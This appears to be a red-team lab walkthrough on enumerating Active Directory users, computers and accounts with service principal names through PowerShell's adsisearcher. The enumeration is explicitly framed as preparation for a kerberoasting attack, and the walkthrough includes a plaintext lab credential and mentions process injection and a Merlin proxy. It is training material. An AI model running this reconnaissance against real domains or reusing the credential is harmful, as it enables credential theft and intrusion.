# Advanced Enumeration

[adsiSearcher] Is a Type Accelerator
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.3

Type accelerators are aliases for .NET framework classes. They allow you to access specific .NET framework classes without having to explicitly type the entire class name.

- on every machine with no additional installs required

1. Remote from LIGHTEATER to the TWORIVERS.wheel.co machine using the wheel\macauthon | pw: Ch!ldr3nOfTheL1ght  acount.  This only works if you are in the security context of a domain user.  If you have system, you can also inject into a domain users process to assume that context, or impersonate.
   
2. Open powershell_ise.

![Open ISE](./powershell_ise.png)

3. `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`

$psISE.PowerShellTabs.Add()
$psISE.PowerShellTabs.SetSelectedPowerShellTab($psISE.PowerShellTabs[0])
$a = $psISE.PowerShellTabs[1].InvokeSynchronous("([adsisearcher]`'(&(objectCategory=user))`').findall()")
$a

![PS AD Enumeration](./powershell-enum.png)

1. Enumerate users and computers.
```
"([adsisearcher]'(&(objectCategory=user))').findall()|convertto-json"

([adsisearcher]'(&(objectCategory=Computer))').findall()|convertto-json
```

1. Previous enumeration reveals several domain users and computers with Service Principal Names (SPNs). To determine which accounts could be targeted for a kerberoasting attack, perform an LDAP query for all users assigned SPNs in order to generate a list of their SAM account names (this is needed later).  

```
[string[]]$sams=([adsisearcher]"(&(objectCategory=user)(serviceprincipalname=*))").findall()|%{$_.properties["samaccountname"]};$sams
```
---------------tested to here for enumeraiton-------------

<details><summary> OPTIONAL METHOD THAT IS MORE NOISY USING FULL SHELL</summary>


This will run through the merlin socks5 proxy, leveraging either schduled tasks or the regcmds in previous events.

1. First you want to enumerate, pull back the information to your device and document so you are situationally aware.
   
   ```ps1
    ([adsisearcher]"objectcategory=user").findall()
    ([adsisearcher]"objectcategory=computer").findall()
    ([adsisearcher]"serviceprincipalname=*").findall().properties.serviceprincipalname
    (([adsisearcher]"serviceprincipalname=*").findall(),properties)|fl*
   ```
   
2. Now with the domain user, collect accounts with SPNs.
 
    ```ps1
    $search = New-Object DirectoryServices.DirectorySearcher([ADSI]"") 
    $search.filter = "(&(servicePrincipalName=*)(objectCategory=user))" 
    $results = $search.Findall() 
    foreach ($results in $results) { $u = $results.GetDirectoryEntry(); $u.name; $u.samaccountname; foreach ($s in $u.servicePrincipalName) { $s; } Write-Host "---";}
    ```

